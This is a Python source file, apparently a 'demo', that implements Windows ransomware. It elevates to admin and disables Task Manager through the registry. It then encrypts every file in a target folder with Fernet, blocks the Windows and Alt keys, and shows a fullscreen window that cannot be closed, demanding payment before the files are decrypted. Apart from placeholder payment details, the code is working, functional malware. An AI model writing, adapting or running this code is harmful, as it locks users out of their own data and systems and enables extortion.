# Data to configure

PAYMENT = "1234567890"
ADDRESS = "1234567890"
CONTACT = "user@example.com"
FOLDER_PATH = r"Dummy folder" # Folder to encrypt/decrypt
KEY = "1234ABCD"

import sys
import ctypes
import os
import tkinter as tk
from tkinter import messagebox
from cryptography.fernet import Fernet
import keyboard

# Key file location
KEY_FILE = r"encryption.key"

# List of keys to block
blocked_keys = ['left windows', 'right windows', 'alt', 'alt gr']

def run_as_admin():
    """
    Request admin privileges for the script and re-run it.
    """
    if not ctypes.windll.shell32.IsUserAnAdmin():
        script = os.path.abspath(sys.argv[0])
        params = " ".join([f'"{arg}"' for arg in sys.argv[1:]])
        # Relaunch with admin
        ctypes.windll.shell32.ShellExecuteW(
            None,                   # handle to parent window (None = default)
            "runas",                # tells Windows to request admin elevation
            sys.executable,         # path to Python interpreter or .exe (used to relaunch)
            f'"{script}" {params}', # full command with the script and its arguments
            None,                   # current directory (None = current)
            1                       # window mode (1 = show normal)
        )
        sys.exit()

def generate_key():
    """
    Generate and save encryption key.
    """
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as key_file:
        key_file.write(key)
    print("Encryption key generated and saved.")

def load_key():
    """
    Load the encryption key.
    """
    return open(KEY_FILE, "rb").read()

def encrypt_folder(path, key):
    """
    Encrypt files in the specified folder.
    """
    fernet = Fernet(key)

    for root, _, files in os.walk(path):
        for file in files:
            file_path = os.path.join(root, file)
            
            # Skip encryption of the key file itself
            if file == os.path.basename(KEY_FILE):
                continue

            with open(file_path, "rb") as f:
                data = f.read()

            encrypted = fernet.encrypt(data)

            with open(file_path, "wb") as f:
                f.write(encrypted)

            print(f"Encrypted: {file_path}")

def decrypt_folder(path, key):
    """
    Decrypt files in the specified folder.
    """
    fernet = Fernet(key)

    for root, _, files in os.walk(path):
        for file in files:
            file_path = os.path.join(root, file)
            
            # Skip decryption of the key file itself
            if file == os.path.basename(KEY_FILE):
                continue

            with open(file_path, "rb") as f:
                data = f.read()

            try:
                decrypted = fernet.decrypt(data)
                with open(file_path, "wb") as f:
                    f.write(decrypted)

                print(f"Decrypted: {file_path}")

            except Exception as e:
                print(f"Failed to decrypt {file_path}: {e}")

def ransomware_prompt():
    """
    Executes the ransomware prompt.
    """
    window = tk.Tk()
    window.title("Files Locked (Demo)")
    window.attributes("-fullscreen", True)
    window.configure(bg="black")

    message = tk.Label(window, text=f"""
Your computer is LOCKED!
Enter the KEY to unlock.
Send {PAYMENT} to the following address:
{ADDRESS}
Then contact {CONTACT} with your transaction ID.
""", font=("Arial", 30), fg="red", bg="black")
    
    message.pack(expand=True, fill=tk.BOTH) #Center and expand the message (both horizontally and vertically)

    entry = tk.Entry(window, font=("Arial", 24), justify='center')
    entry.pack(pady=20)

    def validate_key():
        if entry.get() == KEY:
            messagebox.showinfo("Unlocked", "Correct Key Entered!")
            decrypt_folder(FOLDER_PATH, load_key())
            # Re-enable Task Manager
            os.system('reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /f')
            window.destroy()
            exit(0)  # Exit the program
        else:
            messagebox.showerror("Incorrect Key", "Wrong Key Entered!\nPayment required to unlock.")

    submit_btn = tk.Button(window, text="Submit Key", command=validate_key, font=("Arial", 20), bg="red", fg="white")
    submit_btn.pack(pady=10)

    window.protocol("WM_DELETE_WINDOW", lambda: None)  # Disable window close
    
    window.mainloop()

if __name__ == "__main__":
    run_as_admin()

    # Disable Task Manager
    os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f')

    while not os.path.exists(KEY_FILE):
        generate_key()
    encrypt_folder(FOLDER_PATH, load_key())
    
    for key in blocked_keys:
        keyboard.block_key(key)
    
    ransomware_prompt()
